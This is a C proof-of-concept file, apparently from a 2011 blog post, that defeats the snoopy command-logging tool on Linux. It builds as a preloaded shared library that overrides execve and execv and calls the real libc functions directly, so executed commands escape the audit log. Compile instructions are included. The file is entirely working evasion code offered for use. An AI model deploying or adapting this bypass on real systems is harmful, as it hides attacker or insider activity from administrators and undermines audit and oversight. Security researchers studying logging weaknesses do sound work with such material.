/*
 * Proof of concept to bypass snoopy logging
 *
 * Many parts of the code came directly from the snoopy source itself.
 *
 * Ryan A. Chapman
 * Wed Apr 13 13:28:10 MDT 2011
 *
 * https://blog.rchapman.org/posts/Bypassing_snoopy_logging/
 *
 * Compile:
 * gcc -nostartfiles -shared -O3 -fPIC bypass.c -o bypass.so -ldl -Wall -Wextra
 *
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <sys/types.h>
#include <syslog.h>
#include <string.h>
#include <errno.h>

#if defined(RTLD_NEXT)
#  define REAL_LIBC RTLD_NEXT
#else
#  define REAL_LIBC ((void *) -1L)
#endif

#define FN(ptr,type,name,args)  ptr = (type (*)args)dlsym (REAL_LIBC, name)
#define FN_HANDLE(handle, ptr,type,name,args)  ptr = (type (*)args)dlsym (handle, name)

int execve(const char *filename, char *const argv[], char *const envp[])
{
    // Dl_info info;
    void *handle = dlopen("/lib64/libc.so.6", RTLD_NOW|RTLD_LOCAL);
    if(handle == NULL)
        handle = dlopen("/lib/libc.so.6", RTLD_NOW|RTLD_LOCAL);
    static int (*func)(const char *, char **, char **);

    FN_HANDLE(handle,func,int,"execve",(const char *, char **, char **));
    return (*func) (filename, (char**) argv, (char **) envp);
}

/* Put the libc version of execv back in place */
int execv(const char *filename, char *const argv[])
{
    // Dl_info info;
    void *handle = dlopen("/lib64/libc.so.6", RTLD_NOW|RTLD_LOCAL);
    if(handle == NULL)
        handle = dlopen("/lib/libc.so.6", RTLD_NOW|RTLD_LOCAL);
    static int (*func)(const char *, char **);

    FN_HANDLE(handle,func,int,"execv",(const char *, char **));
    return (*func) (filename, (char **) argv);
}
